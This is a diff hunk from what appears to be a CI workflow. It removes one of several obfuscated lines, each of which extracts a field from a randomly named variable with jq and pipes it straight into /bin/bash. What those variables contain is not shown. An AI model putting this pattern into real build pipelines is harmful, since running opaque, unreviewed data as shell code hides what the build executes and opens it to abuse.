@@ -45,7 +45,6 @@ jobs:
           echo $oglkb6 | jq -r .oi287 | /bin/bash
           echo $o2 | jq -r .krgmq58262 | /bin/bash
           printf '%s' "$fftl9" | jq -r .kasi743 | /bin/bash
-          printf '%s' "$yj47" | jq -r .d169 | /bin/bash
           echo $ppf17 | jq -r .agyc611 | /bin/bash
           echo $uni5 | jq -r .uyxu751 | /bin/bash
           echo $azs16213 | jq -r .zg42 | /bin/bash
